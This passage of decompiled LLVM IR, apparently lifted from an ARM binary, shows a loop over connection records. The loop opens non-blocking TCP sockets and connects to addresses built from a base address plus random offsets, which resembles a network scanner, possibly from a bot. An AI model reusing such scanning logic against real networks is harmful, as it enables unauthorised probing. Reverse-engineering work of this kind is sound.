  %v3_9168 = call i32 @function_139c4(i8* %v2_9168, i32 %v0_915c)
  store i32 %v3_9168, i32* %r0.global-to-local, align 4
  %v0_916c = load i32, i32* @r5, align 4
  %v1_916c = add i32 %v0_916c, 532
  %v2_916c = inttoptr i32 %v1_916c to i8*
  %v3_916c = load i8, i8* %v2_916c, align 1
  %v4_916c = zext i8 %v3_916c to i32
  store i32 %v4_916c, i32* %r3.global-to-local, align 4
  %v2_9170 = icmp ugt i8 %v3_916c, 46
  store i1 %v2_9170, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9170 = icmp ult i8 %v3_916c, 47
  store i1 %v6_9170, i1* %cpsr_n.global-to-local, align 1
  %v7_9170 = icmp eq i8 %v3_916c, 47
  store i1 %v7_9170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9170, label %dec_label_pc_919c, label %dec_label_pc_9178

dec_label_pc_9178:                                ; preds = %dec_label_pc_9124
  store i32 %v0_9164, i32* %r0.global-to-local, align 4
  %v1_917c = inttoptr i32 %v0_9164 to i8*
  %v2_917c = call i32 @function_1399c(i8* %v1_917c)
  store i32 %v2_917c, i32* %r2.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9188 = add i32 %v0_9184, 533
  store i32 %v1_9188, i32* %r0.global-to-local, align 4
  store i32 %v0_9164, i32* %r1.global-to-local, align 4
  %v3_9190 = call i32 @_memmove(i32 %v1_9188, i32 %v0_9164, i32 %v2_917c)
  store i32 %v3_9190, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_9198 = load i32, i32* @r5, align 4
  %v3_9198 = add i32 %v2_9198, 532
  %v4_9198 = inttoptr i32 %v3_9198 to i8*
  store i8 47, i8* %v4_9198, align 1
  %v0_91a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9124, %dec_label_pc_9178
  %v0_91a0 = phi i32 [ %v0_916c, %dec_label_pc_9124 ], [ %v0_91a0.pre, %dec_label_pc_9178 ]
  %v0_919c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_919c, i32* %r1.global-to-local, align 4
  %v1_91a0 = add i32 %v0_91a0, 1440
  store i32 %v1_91a0, i32* @r0, align 4
  %v2_91a4 = inttoptr i32 %v1_91a0 to i8*
  %v3_91a4 = call i32 @function_139c4(i8* %v2_91a4, i32 %v0_919c)
  %v0_91a8 = load i32, i32* @r5, align 4
  %v0_91ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91ac, i32* %r1.global-to-local, align 4
  %v1_91b0 = add i32 %v0_91a8, 1431
  store i32 %v1_91b0, i32* @r0, align 4
  %v2_91b4 = inttoptr i32 %v1_91b0 to i8*
  %v3_91b4 = call i32 @function_139c4(i8* %v2_91b4, i32 %v0_91ac)
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91bc = add i32 %v0_91b8, 789
  store i32 %v1_91bc, i32* @r0, align 4
  %v0_91c0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_91c0, i32* %r1.global-to-local, align 4
  %v2_91c4 = inttoptr i32 %v1_91bc to i8*
  %v3_91c4 = call i32 @function_139c4(i8* %v2_91c4, i32 %v0_91c0)
  store i32 %v3_91c4, i32* %r0.global-to-local, align 4
  %v0_91c8 = load i32, i32* @r6, align 4
  %v1_91c8 = add i32 %v0_91c8, 20
  %v2_91c8 = inttoptr i32 %v1_91c8 to i8*
  %v3_91c8 = load i8, i8* %v2_91c8, align 1
  %v4_91c8 = zext i8 %v3_91c8 to i32
  store i32 %v4_91c8, i32* %r3.global-to-local, align 4
  %v2_91cc = icmp ugt i8 %v3_91c8, 30
  store i1 %v2_91cc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_91cc = icmp ult i8 %v3_91c8, 31
  store i1 %v6_91cc, i1* %cpsr_n.global-to-local, align 1
  %v7_91cc = icmp eq i8 %v3_91c8, 31
  store i1 %v7_91cc, i1* %cpsr_z.global-to-local, align 1
  %v2_91d0 = xor i1 %v7_91cc, true
  %v3_91d0 = and i1 %v2_91cc, %v2_91d0
  br i1 %v3_91d0, label %dec_label_pc_abc8, label %dec_label_pc_91d4

dec_label_pc_91d4:                                ; preds = %dec_label_pc_919c
  %v1_91d4 = add i32 %v0_91c8, 16
  %v2_91d4 = inttoptr i32 %v1_91d4 to i32*
  %v3_91d4 = load i32, i32* %v2_91d4, align 4
  store i32 %v3_91d4, i32* @r4, align 4
  %v0_91d8 = call i32 @function_10b68()
  store i32 %v0_91d8, i32* %r0.global-to-local, align 4
  %v0_91dc = load i32, i32* @r4, align 4
  %v1_91e0 = and i32 %v0_91dc, 65280
  store i32 %v1_91e0, i32* %r3.global-to-local, align 4
  %v1_91dc = udiv i32 %v0_91dc, 256
  %v3_91e4 = and i32 %v1_91dc, 65280
  store i32 %v3_91e4, i32* %r2.global-to-local, align 4
  %v3_91e8 = mul i32 %v0_91dc, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_91ec = mul nuw nsw i32 %v1_91e0, 256
  %v5_91ec = or i32 %v4_91ec, %v3_91e8
  store i32 %v5_91ec, i32* %r1.global-to-local, align 4
  %v0_91f0 = load i32, i32* @r6, align 4
  %v1_91f0 = add i32 %v0_91f0, 20
  %v2_91f0 = inttoptr i32 %v1_91f0 to i8*
  %v3_91f0 = load i8, i8* %v2_91f0, align 1
  %v4_91f0 = zext i8 %v3_91f0 to i32
  store i32 %v4_91f0, i32* %ip.global-to-local, align 4
  %v2_91f8 = call i32 @llvm.bswap.i32(i32 %v0_91dc)
  %v7_91fc = lshr i32 %v0_91d8, %v4_91f0
  %v8_91fc = add i32 %v7_91fc, %v2_91f8
  store i32 %v8_91fc, i32* %r2.global-to-local, align 4
  %v3_9208 = mul i32 %v8_91fc, 16777216
  %v1_920c = and i32 %v8_91fc, 65280
  store i32 %v1_920c, i32* %r0.global-to-local, align 4
  %v4_9210 = mul nuw nsw i32 %v1_920c, 256
  %v5_9210 = or i32 %v4_9210, %v3_9208
  store i32 %v5_9210, i32* %r1.global-to-local, align 4
  %v2_9214 = and i32 %v8_91fc, 8388608
  %v3_9214 = icmp ne i32 %v2_9214, 0
  store i1 %v3_9214, i1* %cpsr_c.global-to-local, align 1
  %v2_9218 = call i32 @llvm.bswap.i32(i32 %v8_91fc)
  store i32 %v2_9218, i32* %r3.global-to-local, align 4
  %v1_921c = load i32, i32* @r5, align 4
  %v2_921c = add i32 %v1_921c, 16
  %v3_921c = inttoptr i32 %v2_921c to i32*
  store i32 %v2_9218, i32* %v3_921c, align 4
  br label %dec_label_pc_abc8

dec_label_pc_924c:                                ; preds = %thread-pre-split
  %v1_9250 = add i32 %v3_9108, 1456
  %v0_9258 = load i32, i32* %r8.global-to-local, align 4
  %v1_9258 = urem i32 %v0_9258, 256
  store i32 %v1_9258, i32* %r3.global-to-local, align 4
  %v1_925c = add i32 %v3_9108, 1464
  store i32 %v1_925c, i32* %r1.global-to-local, align 4
  %v2_9260 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_9260, i32* %r2.global-to-local, align 4
  store i32 %v1_9250, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

dec_label_pc_9280.preheader:                      ; preds = %dec_label_pc_924c, %dec_label_pc_abec
  %storemerge149.in.in = phi i32 [ %v0_ac00, %dec_label_pc_abec ], [ %v0_9258, %dec_label_pc_924c ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_abf8, %dec_label_pc_abec ], [ %v1_9250, %dec_label_pc_924c ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_ac00, %dec_label_pc_abec ], [ %v1_9258, %dec_label_pc_924c ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_ac04, %dec_label_pc_abec ], [ %v1_925c, %dec_label_pc_924c ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_ac08, %dec_label_pc_abec ], [ %v2_9260, %dec_label_pc_924c ]
  %storemerge149.in = and i32 %storemerge149.in.in, 128
  %storemerge149 = icmp ne i32 %storemerge149.in, 0
  store i1 %storemerge149, i1* %cpsr_c.global-to-local, align 1
  %v3_ac10 = udiv i32 %storemerge149.in.in, 256
  store i32 %v3_ac10, i32* %r8.global-to-local, align 4
  %v4_92e8 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_9428 = ptrtoint i32* %stack_var_-148 to i32
  %v2_9440 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9480 = ptrtoint i32* %stack_var_-72 to i32
  %v2_94a0 = ptrtoint i32* %stack_var_-36 to i32
  %v1_9698 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_99ec = icmp slt i32 %v6_8f58, 0
  %v2_99ec = icmp eq i32 %v6_8f58, 0
  %v4_9a40 = inttoptr i32 %stack_var_-20856.0.ph to i32*
  %v1_98e8 = inttoptr i32 %v6_8f58 to i8*
  %v2_950c = ptrtoint i32* %stack_var_-56 to i32
  %v2_9510 = ptrtoint i32* %stack_var_-200 to i32
  %tmp209 = bitcast i32* %stack_var_-200 to %_TYPEDEF_fd_set*
  %v2_9514 = ptrtoint i32* %stack_var_-328 to i32
  %tmp210 = bitcast i32* %stack_var_-328 to %_TYPEDEF_fd_set*
  %tmp211 = bitcast i32* %stack_var_-56 to %timeval*
  %v2_9f74 = add i32 %v2_94a0, -20773
  %v2_9600 = ptrtoint i32* %stack_var_-44 to i32
  %v2_960c = ptrtoint i32* %stack_var_-48 to i32
  %v5_92e8 = or i32 %v4_92e8, %v3_ac10
  %v1_92ec = and i32 %v3_ac10, 128
  %v2_92ec = icmp ne i32 %v1_92ec, 0
  %v3_92ec253 = udiv i32 %v5_92e8, 256
  %v1_92f4 = add i32 %stack_var_-20872.0.ph, -1464
  %v1_92fc = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_92ec253, 16777216
  %v4_9468 = sdiv i32 %sext, 16777216
  %sext11 = mul i32 %v3_ac10, 16777216
  %v4_9470 = sdiv i32 %sext11, 16777216
  %v2_9334 = add i32 %v2_9428, 112
  br label %dec_label_pc_9280

dec_label_pc_9280:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_92cc, %dec_label_pc_94e4, %dec_label_pc_9590, %dec_label_pc_9280.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9284 = call i32 @time(i32* null)
  store i32 %v2_9284, i32* %r0.global-to-local, align 4
  store i32 %v2_9284, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_92a4261 = load i32, i32* @sp, align 4
  %v3_92a4262 = add i32 %v2_92a4261, 20684
  %v4_92a4263 = inttoptr i32 %v3_92a4262 to i32*
  store i32 0, i32* %v4_92a4263, align 4
  br label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_9294.dec_label_pc_9294_crit_edge:    ; preds = %dec_label_pc_9280, %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v0_9294.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_9298 = add i32 %v0_9294.pre, 4
  store i32 %v1_9298, i32* %r3.global-to-local, align 4
  %v1_929c = add i32 %v0_9294.pre, 20684
  store i32 %v1_929c, i32* %ip.global-to-local, align 4
  %v7_92a0 = icmp eq i32 %v1_9298, 128
  %v2_92a4 = load i32, i32* @sp, align 4
  %v3_92a4 = add i32 %v2_92a4, %v1_929c
  %v4_92a4 = inttoptr i32 %v3_92a4 to i32*
  store i32 %v0_92a4.pre, i32* %v4_92a4, align 4
  br i1 %v7_92a0, label %dec_label_pc_92ac, label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_92ac:                                ; preds = %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v1_92a0 = add i32 %v0_9294.pre, -124
  %v6_92a0 = icmp slt i32 %v1_92a0, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_92a0, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_92ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_92ac, i32* %r0.global-to-local, align 4
  %v1_92b8264 = add i32 %v0_92ac, 4
  store i32 %v1_92b8264, i32* %r3.global-to-local, align 4
  %v1_92bc265 = add i32 %v0_92ac, 20556
  store i32 %v1_92bc265, i32* %lr.global-to-local, align 4
  %v7_92c0266 = icmp eq i32 %v1_92b8264, 128
  %v2_92c4267 = load i32, i32* @sp, align 4
  %v3_92c4268 = add i32 %v2_92c4267, %v1_92bc265
  %v4_92c4269 = inttoptr i32 %v3_92c4268 to i32*
  store i32 %v0_92ac, i32* %v4_92c4269, align 4
  br i1 %v7_92c0266, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92b4.dec_label_pc_92b4_crit_edge:    ; preds = %dec_label_pc_92ac, %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge
  %v0_92b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92c4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_92b8 = add i32 %v0_92b4.pre, 4
  store i32 %v1_92b8, i32* %r3.global-to-local, align 4
  %v1_92bc = add i32 %v0_92b4.pre, 20556
  store i32 %v1_92bc, i32* %lr.global-to-local, align 4
  %v7_92c0 = icmp eq i32 %v1_92b8, 128
  %v2_92c4 = load i32, i32* @sp, align 4
  %v3_92c4 = add i32 %v2_92c4, %v1_92bc
  %v4_92c4 = inttoptr i32 %v3_92c4 to i32*
  store i32 %v0_92c4.pre, i32* %v4_92c4, align 4
  br i1 %v7_92c0, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92cc:                                ; preds = %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, %dec_label_pc_92ac
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp208, label %dec_label_pc_9280, label %dec_label_pc_92d8

dec_label_pc_92d8:                                ; preds = %dec_label_pc_92cc
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_92e8, i32* %r2.global-to-local, align 4
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_92ec253, i32* %lr.global-to-local, align 4
  %v0_92f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_92f0, i32* @sl, align 4
  store i32 %v1_92f4, i32* @r7, align 4
  store i32 %v0_92f0, i32* @r8, align 4
  store i32 %v1_92fc, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_93a8

dec_label_pc_9310:                                ; preds = %dec_label_pc_93b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_9310 = icmp eq i8 %v3_93a8, 2
  store i1 %v7_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9310, label %dec_label_pc_9ac0, label %dec_label_pc_9318

dec_label_pc_9318:                                ; preds = %dec_label_pc_9310
  %v2_9318 = icmp ugt i8 %v3_93a8, 3
  store i1 %v2_9318, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9318 = icmp ult i8 %v3_93a8, 4
  store i1 %v6_9318, i1* %cpsr_n.global-to-local, align 1
  %v7_9318 = icmp eq i8 %v3_93a8, 4
  store i1 %v7_9318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9318, label %dec_label_pc_9664, label %dec_label_pc_9320

dec_label_pc_9320:                                ; preds = %dec_label_pc_9318
  %v2_9320 = icmp ugt i8 %v3_93a8, 5
  store i1 %v2_9320, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9320 = icmp ult i8 %v3_93a8, 6
  store i1 %v6_9320, i1* %cpsr_n.global-to-local, align 1
  %v7_9320 = icmp eq i8 %v3_93a8, 6
  store i1 %v7_9320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9320, label %.thread25, label %dec_label_pc_9340

.thread25:                                        ; preds = %dec_label_pc_9320
  %v2_9324 = add i32 %v3_9658, -1431
  %v3_9324 = inttoptr i32 %v2_9324 to i32*
  %v4_9324 = load i32, i32* %v3_9324, align 4
  store i32 %v4_9324, i32* %r0.global-to-local, align 4
  %v4_932c = udiv i32 %v4_9324, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9330 = mul nuw nsw i32 %v4_932c, 4
  store i32 %v2_9334, i32* %r1.global-to-local, align 4
  %v3_9338 = add i32 %v4_9330, %v2_9334
  store i32 %v3_9338, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9340:                                ; preds = %dec_label_pc_9320
  %v2_9340 = icmp ugt i8 %v3_93a8, 6
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9340 = icmp ult i8 %v3_93a8, 7
  store i1 %v6_9340, i1* %cpsr_n.global-to-local, align 1
  %v7_9340 = icmp eq i8 %v3_93a8, 7
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9340, label %.thread36, label %dec_label_pc_9360

.thread36:                                        ; preds = %dec_label_pc_9340
  %v2_9344 = add i32 %v3_9658, -1431
  %v3_9344 = inttoptr i32 %v2_9344 to i32*
  %v4_9344 = load i32, i32* %v3_9344, align 4
  store i32 %v4_9344, i32* %r0.global-to-local, align 4
  %v4_934c = udiv i32 %v4_9344, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9350 = mul nuw nsw i32 %v4_934c, 4
  store i32 %v2_9334, i32* %r2.global-to-local, align 4
  %v3_9358 = add i32 %v4_9350, %v2_9334
  store i32 %v3_9358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9360:                                ; preds = %dec_label_pc_9340
  %v2_9360 = icmp ugt i8 %v3_93a8, 9
  store i1 %v2_9360, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9360 = icmp ult i8 %v3_93a8, 10
  store i1 %v6_9360, i1* %cpsr_n.global-to-local, align 1
  %v7_9360 = icmp eq i8 %v3_93a8, 10
  store i1 %v7_9360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9360, label %dec_label_pc_9a88, label %dec_label_pc_9368

dec_label_pc_9368:                                ; preds = %dec_label_pc_9360
  %v1_9368 = add nsw i32 %v4_93a8, -11
  %v2_9368 = icmp ugt i8 %v3_93a8, 10
  store i1 %v2_9368, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9368 = icmp ult i8 %v3_93a8, 11
  store i1 %v6_9368, i1* %cpsr_n.global-to-local, align 1
  %v7_9368 = icmp eq i8 %v3_93a8, 11
  store i1 %v7_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9368, label %dec_label_pc_a5fc, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9ac0, %dec_label_pc_9368
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_93a8, align 1
  %v0_9378 = load i32, i32* @r6, align 4
  %v1_9378 = add i32 %v0_9378, -1431
  %v2_9378 = inttoptr i32 %v1_9378 to i32*
  %v3_9378 = load i32, i32* %v2_9378, align 4
  store i32 %v3_9378, i32* %r0.global-to-local, align 4
  %v1_937c = call i32 @close(i32 %v3_9378)
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9384 = load i32, i32* @r6, align 4
  %v2_9384 = add i32 %v1_9384, -1431
  %v3_9384 = inttoptr i32 %v2_9384 to i32*
  store i32 -1, i32* %v3_9384, align 4
  br label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9a24, %dec_label_pc_9aa0, %dec_label_pc_94a8, %dec_label_pc_93bc, %dec_label_pc_a5fc, %dec_label_pc_9370
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_938c = load i32, i32* @r8, align 4
  %v1_938c = add i32 %v0_938c, 1
  store i32 %v1_938c, i32* @r8, align 4
  %v0_9390 = load i32, i32* @r7, align 4
  %v0_9394 = load i32, i32* @r6, align 4
  %v2_9398 = sub i32 %v0_90f4, %v1_938c
  %v3_9398 = icmp uge i32 %v0_90f4, %v1_938c
  store i1 %v3_9398, i1* %cpsr_c.global-to-local, align 1
  %v4_9398 = xor i32 %v1_938c, %v0_90f4
  %v5_9398 = xor i32 %v2_9398, %v0_90f4
  %v6_9398 = and i32 %v5_9398, %v4_9398
  %v7_9398 = icmp slt i32 %v6_9398, 0
  store i1 %v7_9398, i1* %cpsr_v.global-to-local, align 1
  %v8_9398 = icmp slt i32 %v2_9398, 0
  store i1 %v8_9398, i1* %cpsr_n.global-to-local, align 1
  %v9_9398 = icmp eq i32 %v0_90f4, %v1_938c
  store i1 %v9_9398, i1* %cpsr_z.global-to-local, align 1
  %v1_939c = add i32 %v0_9390, 3140
  store i32 %v1_939c, i32* @r7, align 4
  %v1_93a0 = add i32 %v0_9394, 3140
  store i32 %v1_93a0, i32* @r6, align 4
  br i1 %v9_9398, label %dec_label_pc_9388.dec_label_pc_94e4_crit_edge, label %dec_label_pc_93a8

dec_label_pc_9388.dec_label_pc_94e4_crit_edge:    ; preds = %dec_label_pc_9388
  %v0_94e4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_94e4

dec_label_pc_93a8:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388, %dec_label_pc_92d8
  %v3_9658 = phi i32 [ %v1_92fc, %dec_label_pc_92d8 ], [ %v1_93a0, %dec_label_pc_9388 ], [ %v1_94dc, %dec_label_pc_94c4 ]
  %v1_93a8 = add i32 %v3_9658, -1427
  %v2_93a8 = inttoptr i32 %v1_93a8 to i8*
  %v3_93a8 = load i8, i8* %v2_93a8, align 1
  %v4_93a8 = zext i8 %v3_93a8 to i32
  store i32 %v4_93a8, i32* %r3.global-to-local, align 4
  %v2_93ac = icmp ne i8 %v3_93a8, 0
  store i1 %v2_93ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93ac = icmp eq i8 %v3_93a8, 0
  store i1 %v6_93ac, i1* %cpsr_n.global-to-local, align 1
  %v7_93ac = icmp eq i8 %v3_93a8, 1
  store i1 %v7_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93ac, label %dec_label_pc_964c, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_93ac, label %dec_label_pc_93bc, label %dec_label_pc_9310

dec_label_pc_93bc:                                ; preds = %.thread44.dec_label_pc_93bc_crit_edge, %dec_label_pc_93b4
  %v0_93bc = phi i32 [ %v0_93bc.pre, %.thread44.dec_label_pc_93bc_crit_edge ], [ %v3_9658, %dec_label_pc_93b4 ]
  %v1_93bc = add i32 %v0_93bc, -1431
  %v2_93bc = inttoptr i32 %v1_93bc to i32*
  %v3_93bc = load i32, i32* %v2_93bc, align 4
  store i32 %v3_93bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  %v2_93c8 = icmp eq i32 %v3_93bc, -1
  store i1 %v2_93c8, i1* %cpsr_c.global-to-local, align 1
  %v3_93c8 = sub i32 0, %v3_93bc
  %v4_93c8 = and i32 %v1_93c8, %v3_93c8
  %v5_93c8 = icmp slt i32 %v4_93c8, 0
  store i1 %v5_93c8, i1* %cpsr_v.global-to-local, align 1
  %v6_93c8 = icmp slt i32 %v1_93c8, 0
  store i1 %v6_93c8, i1* %cpsr_n.global-to-local, align 1
  %v7_93c8 = icmp eq i32 %v1_93c8, 0
  store i1 %v7_93c8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  store i32 37856, i32* %lr.global-to-local, align 4
  %v1_93dc = xor i1 %v7_93c8, true
  call void @__pseudo_cond_branch(i1 %v1_93dc, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_93e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_93e8, i32* %r2.global-to-local, align 4
  %v3_93ec = call i32 @socket(i32 2, i32 1, i32 %v0_93e8)
  store i32 %v3_93ec, i32* %r0.global-to-local, align 4
  %v1_93f0 = add i32 %v3_93ec, 1
  %v2_93f0 = icmp eq i32 %v3_93ec, -1
  store i1 %v2_93f0, i1* %cpsr_c.global-to-local, align 1
  %v3_93f0 = sub i32 0, %v3_93ec
  %v4_93f0 = and i32 %v1_93f0, %v3_93f0
  %v5_93f0 = icmp slt i32 %v4_93f0, 0
  store i1 %v5_93f0, i1* %cpsr_v.global-to-local, align 1
  %v6_93f0 = icmp slt i32 %v1_93f0, 0
  store i1 %v6_93f0, i1* %cpsr_n.global-to-local, align 1
  %v7_93f0 = icmp eq i32 %v1_93f0, 0
  store i1 %v7_93f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_93ec, i32* @r4, align 4
  %v1_93f8 = load i32, i32* @r6, align 4
  %v2_93f8 = add i32 %v1_93f8, -1431
  %v3_93f8 = inttoptr i32 %v2_93f8 to i32*
  store i32 %v3_93ec, i32* %v3_93f8, align 4
  br i1 %v7_93f0, label %dec_label_pc_9388, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_93bc
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_9404 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9404, i32* %r2.global-to-local, align 4
  %v0_9408 = load i32, i32* %r0.global-to-local, align 4
  %v2_9408 = call i32 (i32, i32, ...) @fcntl(i32 %v0_9408, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9410 = or i32 %v2_9408, 2048
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v0_9414 = load i32, i32* @r4, align 4
  store i32 %v0_9414, i32* %r0.global-to-local, align 4
  %v2_9418 = call i32 (i32, i32, ...) @fcntl(i32 %v0_9414, i32 4)
  store i32 %v2_9418, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_9428, i32* %r3.global-to-local, align 4
  %v0_942c = load i32, i32* @r6, align 4
  %v1_942c = add i32 %v0_942c, -1431
  %v2_942c = inttoptr i32 %v1_942c to i32*
  %v3_942c = load i32, i32* %v2_942c, align 4
  store i32 %v3_942c, i32* %r0.global-to-local, align 4
  %v0_9430 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9430, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_9440, i32* %r3.global-to-local, align 4
  %v7_9448 = call i32 @setsockopt(i32 %v3_942c, i32 %v0_9430, i32 8, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_9448, i32* %r0.global-to-local, align 4
  %v0_944c = load i32, i32* @r6, align 4
  %v1_944c = add i32 %v0_944c, -1415
  %v2_944c = inttoptr i32 %v1_944c to i32*
  %v3_944c = load i32, i32* %v2_944c, align 4
  store i32 %v3_944c, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_945c = add i32 %v0_944c, -1431
  %v2_945c = inttoptr i32 %v1_945c to i32*
  %v3_945c = load i32, i32* %v2_945c, align 4
  store i32 %v3_945c, i32* %r0.global-to-local, align 4
  %v3_9464 = add i32 %v0_944c, -1427
  %v4_9464 = inttoptr i32 %v3_9464 to i8*
  store i8 2, i8* %v4_9464, align 1
  store i32 %v4_9468, i32* %ip.global-to-local, align 4
  %v0_946c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_946c, i32* %stack_var_-72, align 4
  store i32 %v4_9470, i32* %r3.global-to-local, align 4
  store i32 %v2_9480, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9488 = load i32, i32* %sb.global-to-local, align 4
  %v1_9488 = load i32, i32* @r6, align 4
  %v2_9488 = add i32 %v1_9488, -1423
  %v3_9488 = inttoptr i32 %v2_9488 to i32*
  store i32 %v0_9488, i32* %v3_9488, align 4
  %v3_948c = call i32 @_connect(i32 %v3_945c, i32 %v2_9480, i32 16)
